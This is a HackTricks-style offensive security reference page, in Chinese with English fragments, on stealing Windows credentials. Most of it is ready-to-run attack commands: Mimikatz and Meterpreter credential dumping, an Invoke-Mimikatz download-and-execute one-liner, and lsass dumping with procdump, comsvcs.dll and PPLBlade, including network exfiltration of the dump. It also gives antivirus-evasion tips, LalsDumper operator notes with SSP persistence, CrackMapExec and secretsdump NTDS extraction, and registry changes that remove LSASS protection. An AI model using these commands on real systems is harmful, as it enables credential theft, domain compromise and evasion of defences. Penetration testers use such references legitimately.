# 窃取 Windows 凭证

{{#include ../../banners/hacktricks-training.md}}

## 凭证 Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**在 [**this page**](credentials-mimikatz.md) 查找 Mimikatz 可以做的其他功能。**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**在这里了解一些可能的凭证保护。**](credentials-protections.md) **这些保护可能会阻止 Mimikatz 提取某些凭证。**

## 使用 Meterpreter 的凭证

使用 [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **我创建的** 在受害者主机内 **搜索密码和哈希**。
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## 绕过 AV

### Procdump + Mimikatz

因为 **Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**是一款合法的 Microsoft 工具**，因此不会被 Defender 检测到。\
你可以使用此工具 **dump the lsass process**、**download the dump**，并从 dump 中 **extract** **credentials locally**。

你也可以使用 [SharpDump](https://github.com/GhostPack/SharpDump)。
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
此过程可通过 [SprayKatz](https://github.com/aas-n/spraykatz) 自动完成：`./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**注意**：一些 **AV** 可能会将使用 **procdump.exe to dump lsass.exe** 识别为 **恶意**，这是因为它们会检测到字符串 **"procdump.exe" 和 "lsass.exe"**。因此将 lsass.exe 的 **PID** 作为 **参数** 传递给 procdump，而不是使用名称 **lsass.exe**，会更加 **隐蔽**。

### 使用 **comsvcs.dll** 转储 lsass

位于 `C:\Windows\System32` 的名为 **comsvcs.dll** 的 DLL 在崩溃时负责 **转储进程内存**。该 DLL 包含一个名为 **`MiniDumpW`** 的 **函数**，可通过 `rundll32.exe` 调用。\
前两个参数可以忽略，但第三个参数被分为三部分。要转储的进程 ID 为第一部分，转储文件位置为第二部分，第三部分严格要求为单词 **full**，没有其他选项。\
在解析这三部分后，DLL 会创建转储文件并将指定进程的内存写入该文件。\
可以使用 **comsvcs.dll** 转储 lsass 进程，从而无需上传并执行 procdump。该方法的详细说明见 [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords)。

可使用以下命令执行：
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**您可以使用** [**lssasy**](https://github.com/Hackndo/lsassy)**。**

### **使用 Task Manager 转储 lsass**

1. 在 Task Bar 上右键并点击 Task Manager
2. 点击 More details
3. 在 Processes 选项卡中搜索 "Local Security Authority Process" 进程
4. 在 "Local Security Authority Process" 进程上右键并点击 "Create dump file".

### Dumping lsass with procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) 是 Microsoft 签名的二进制文件，属于 [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) 套件的一部分。
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## 使用 PPLBlade 转储 lsass

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) 是一款 Protected Process Dumper Tool，支持对内存转储进行混淆并在远程工作站上传输而不将其写入磁盘。

**关键功能**:

1. 绕过 PPL 保护
2. 混淆内存转储文件以规避 Defender 的基于签名的检测机制
3. 使用 RAW 和 SMB 上传方法上传内存转储而不将其写入磁盘（fileless dump）
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-based LSASS dumping without MiniDumpWriteDump

Ink Dragon 提供了一个三阶段的 dumper，称为 **LalsDumper**，它从不调用 `MiniDumpWriteDump`，因此针对该 API 的 EDR 钩子不会触发：

1. **Stage 1 loader (`lals.exe`)** – 在 `fdp.dll` 中搜索由 32 个小写 `d` 字符组成的占位符，用 `rtu.txt` 的绝对路径覆盖它，将修补后的 DLL 保存为 `nfdp.dll`，并调用 `AddSecurityPackageA("nfdp","fdp")`。这会强制 **LSASS** 将该恶意 DLL 作为新的 Security Support Provider (SSP) 加载。
2. **Stage 2 inside LSASS** – 当 LSASS 加载 `nfdp.dll` 时，DLL 读取 `rtu.txt`，将每个字节与 `0x20` 进行 XOR，并将解码后的 blob 映射到内存中然后转移执行。
3. **Stage 3 dumper** – 映射的 payload 重新实现了 MiniDump 的逻辑，使用从哈希化的 API 名称解析出的 **direct syscalls**（seed = 0xCD7815D6; h ^= (ch + ror32(h,8))）。一个名为 `Tom` 的专用导出会打开 `%TEMP%\<pid>.ddt`，将压缩的 LSASS 转储流式写入该文件，然后关闭句柄，以便后续 exfiltration。

Operator notes:

* 将 `lals.exe`、`fdp.dll`、`nfdp.dll` 和 `rtu.txt` 保存在同一目录下。Stage 1 会将硬编码的占位符重写为 `rtu.txt` 的绝对路径，拆分这些文件会中断流程。
* 注册是通过将 `nfdp` 附加到 `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` 来完成的。你可以自行写入该值，使 LSASS 在每次启动时重新加载 SSP。
* `%TEMP%\*.ddt` 文件是压缩的转储。先在本地解压，然后将其提供给 Mimikatz/Volatility 以提取凭证。
* 运行 `lals.exe` 需要 admin/SeTcb 权限以使 `AddSecurityPackageA` 成功；一旦调用返回，LSASS 会透明地加载该恶意 SSP 并执行 Stage 2。
* 从磁盘中删除 DLL 不会将其从 LSASS 中逐出。要么删除注册表项并重启 LSASS（重启系统），要么保留它以实现长期持久化。

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### 从目标 DC 转储 NTDS.dit
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### 从目标 DC 转储 NTDS.dit 的密码历史记录
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### 显示每个 NTDS.dit 账户的 pwdLastSet 属性
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

这些文件应当位于 _C:\windows\system32\config\SAM_ 和 _C:\windows\system32\config\SYSTEM._ 但是 **你不能以普通方式直接复制它们**，因为它们受到保护。

### From Registry

获取这些文件最简单的方法是从 registry 中复制一份：
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**下载** 那些文件到你的 Kali 机器并使用以下命令 **提取哈希**：
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### 卷影复制 (Volume Shadow Copy)

你可以使用此服务复制受保护的文件。你需要是 Administrator。

#### 使用 vssadmin

vssadmin binary 仅在 Windows Server 版本中可用。
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
但你也可以从 **Powershell** 执行相同操作。下面是一个 **如何复制 SAM file** 的示例（所用硬盘为 "C:"，并将其保存到 C:\users\Public），但你可以用它来复制任何受保护的文件：
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
代码来自书籍: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

最后，你也可以使用 [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) 来复制 SAM、SYSTEM 和 ntds.dit。
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

The **NTDS.dit** file is known as the heart of **Active Directory**, holding crucial data about user objects, groups, and their memberships. It's where the **password hashes** for domain users are stored. This file is an **Extensible Storage Engine (ESE)** database and resides at **_%SystemRoom%/NTDS/ntds.dit_**.

在这个数据库中，维护着三个主要表：

- **Data Table**: 该表负责存储有关用户和组等对象的详细信息。
- **Link Table**: 它跟踪对象之间的关系，例如组成员关系。
- **SD Table**: 这里保存每个对象的 **Security descriptors**，以确保存储对象的安全性和访问控制。

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows uses _Ntdsa.dll_ to interact with that file and its used by _lsass.exe_. Then, **part** of the **NTDS.dit** file could be located **inside the `lsass`** memory (you can find the latest accessed data probably because of the performance improve by using a **cache**).

#### Decrypting the hashes inside NTDS.dit

这些 hashes 被加密三次：

1. 使用 **BOOTKEY** 和 **RC4** 解密 Password Encryption Key (**PEK**)。
2. 使用 **PEK** 和 **RC4** 解密该 **hash**。
3. 使用 **DES** 解密 **hash**。

**PEK** have the **same value** in **every domain controller**, but it is **cyphered** inside the **NTDS.dit** file using the **BOOTKEY** of the **SYSTEM file of the domain controller (is different between domain controllers)**. This is why to get the credentials from the NTDS.dit file **you need the files NTDS.dit and SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Copying NTDS.dit using Ntdsutil

自 Windows Server 2008 起可用。
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
你也可以使用 [**volume shadow copy**](#stealing-sam-and-system) 技巧来复制 **ntds.dit** 文件。请记住你还需要一份 **SYSTEM file**（再次，[**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) trick）。

### **从 NTDS.dit 提取哈希**

一旦你**获得**了文件 **NTDS.dit** 和 **SYSTEM**，就可以使用诸如 _secretsdump.py_ 的工具来**提取哈希**：
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
你也可以使用一个有效的域管理员用户**自动提取它们**：
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
对于 **较大的 NTDS.dit 文件**，建议使用 [gosecretsdump](https://github.com/c-sto/gosecretsdump) 提取。

另外，你也可以使用 **metasploit module**：_post/windows/gather/credentials/domain_hashdump_ 或 **mimikatz** `lsadump::lsa /inject`

### **将域对象从 NTDS.dit 提取到 SQLite 数据库**

可以使用 [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) 将 NTDS 对象提取到 SQLite 数据库。不仅会提取 secrets，还会提取完整的对象及其属性，以便在已获取原始 NTDS.dit 文件后进一步进行信息提取。
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
The `SYSTEM` hive 是可选的，但允许对 secrets 进行解密（NT & LM hashes、supplemental credentials，例如 cleartext passwords、kerberos 或 trust keys、NT & LM password histories）。除了其他信息外，会提取以下数据：带有其 hashes 的 user 和 machine accounts、UAC flags、last logon 和 password change 的 timestamp、accounts description、names、UPN、SPN、groups 及递归 memberships、organizational units tree 和 membership、trusted domains 以及 trusts 的 type、direction 和 attributes...

## Lazagne

从 [here](https://github.com/AlessandroZ/LaZagne/releases) 下载 binary。你可以使用该 binary 从多个 software 中提取 credentials。
```
lazagne.exe all
```
## Other tools for extracting credentials from SAM and LSASS

### Windows credentials Editor (WCE)

此工具可用于从内存中提取凭据。下载地址: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

从 SAM 文件中提取凭据
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

从 SAM 文件中提取凭证
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

从以下地址下载:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) 并只需 **执行它**，密码就会被提取。

## 挖掘空闲 RDP 会话并削弱安全控制

Ink Dragon’s FinalDraft RAT 包含一个 `DumpRDPHistory` tasker，其技术对任何 red-teamer 都很有用：

### DumpRDPHistory-style 的遥测收集

* **Outbound RDP targets** – 解析每个用户 hive 在 `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`。每个子键保存服务器名、`UsernameHint` 和最后写入时间戳。你可以用 PowerShell 复现 FinalDraft 的逻辑：

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – 查询 `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` 日志中 Event IDs **21**（成功登录）和 **25**（断开连接），以映射谁管理了该主机：

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

一旦你知道哪个 Domain Admin 定期连接，在他们的 **断开** 会话仍然存在时转储 LSASS（使用 LalsDumper/Mimikatz）。CredSSP + NTLM 回退会将其 verifier 和令牌留在 LSASS 中，然后这些可以通过 SMB/WinRM 重放，以获取 `NTDS.dit` 或在域控制器上建立持久性。

### FinalDraft 针对的注册表降级

同一 implant 还篡改了若干注册表键来使 credential theft 更容易：
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* 设置 `DisableRestrictedAdmin=1` 会在 RDP 期间强制完全重用凭据/票证，从而启用 pass-the-hash 风格的 pivots。
* `LocalAccountTokenFilterPolicy=1` 禁用 UAC 令牌过滤，使本地管理员在网络上获得不受限制的令牌。
* `DSRMAdminLogonBehavior=2` 允许 DSRM 管理员在 DC 在线时登录，给攻击者另一个内置的高权限账户。
* `RunAsPPL=0` 移除 LSASS PPL 保护，使得像 LalsDumper 这样的转储工具可以轻易访问内存。

## 参考资料

- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
